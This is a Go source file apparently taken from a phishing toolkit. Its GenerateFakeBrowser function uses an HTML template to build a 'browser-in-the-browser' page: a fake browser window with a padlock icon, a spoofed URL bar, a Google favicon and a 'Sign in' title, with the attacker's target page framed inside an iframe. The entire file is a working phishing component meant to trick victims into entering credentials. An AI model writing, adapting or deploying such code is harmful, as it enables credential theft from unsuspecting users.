package bib

import (
	"bytes"
	"fmt"
	"html/template"
)

type Attack struct {
	TargetURL   string
	Phishlet    string
	WindowTitle string
	Favicon     string
}

type Window struct {
	Title    string
	URL      string
	Width    int
	Height   int
	Favicon  string
}

func NewAttack(targetURL, phishlet string) *Attack {
	return &Attack{
		TargetURL:   targetURL,
		Phishlet:    phishlet,
		WindowTitle: "Sign in",
		Favicon:     "https://www.google.com/favicon.ico",
	}
}

func (a *Attack) GenerateFakeBrowser(window *Window) string {
	tmpl := `<!DOCTYPE html>
<html>
<head>
    <title>{{.Title}}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .browser-window {
            width: {{.Width}}px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1), 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .browser-header {
            background: #f5f5f5;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #ddd;
        }
        .window-controls {
            display: flex;
            gap: 6px;
            margin-right: 12px;
        }
        .window-controls span {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        .close { background: #ff5f57; }
        .minimize { background: #febc2e; }
        .maximize { background: #28c840; }
        .browser-tabs {
            display: flex;
            flex: 1;
        }
        .browser-tab {
            background: #e8e8e8;
            padding: 6px 12px;
            border-radius: 6px 6px 0 0;
            margin-right: 2px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #333;
        }
        .browser-tab.active {
            background: white;
        }
        .tab-favicon {
            width: 16px;
            height: 16px;
        }
        .browser-url-bar {
            display: flex;
            align-items: center;
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 4px 8px;
            margin: 0 12px;
            flex: 1;
        }
        .lock-icon {
            color: #28a745;
            margin-right: 6px;
        }
        .url-text {
            flex: 1;
            font-size: 12px;
            color: #333;
        }
        .browser-content {
            height: {{.Height}}px;
            border: none;
        }
    </style>
</head>
<body>
    <div class="browser-window">
        <div class="browser-header">
            <div class="window-controls">
                <span class="close"></span>
                <span class="minimize"></span>
                <span class="maximize"></span>
            </div>
            <div class="browser-tabs">
                <div class="browser-tab active">
                    <img src="{{.Favicon}}" class="tab-favicon">
                    <span>{{.Title}}</span>
                </div>
            </div>
            <div class="browser-url-bar">
                <span class="lock-icon">🔒</span>
                <span class="url-text">{{.URL}}</span>
            </div>
        </div>
        <iframe src="{{.TargetURL}}" class="browser-content"></iframe>
    </div>
</body>
</html>`

	t, err := template.New("bib").Parse(tmpl)
	if err != nil {
		return fmt.Sprintf("Error generating BiB: %v", err)
	}

	if window == nil {
		window = &Window{
			Title:   a.WindowTitle,
			URL:     a.TargetURL,
			Width:   800,
			Height:  600,
			Favicon: a.Favicon,
		}
	}

	data := struct {
		Title     string
		URL       string
		TargetURL string
		Width     int
		Height    int
		Favicon   string
	}{
		Title:     window.Title,
		URL:       window.URL,
		TargetURL: a.TargetURL,
		Width:     window.Width,
		Height:    window.Height,
		Favicon:   window.Favicon,
	}

	var buf bytes.Buffer
	if err := t.Execute(&buf, data); err != nil {
		return fmt.Sprintf("Error executing template: %v", err)
	}
	
	return buf.String()
}
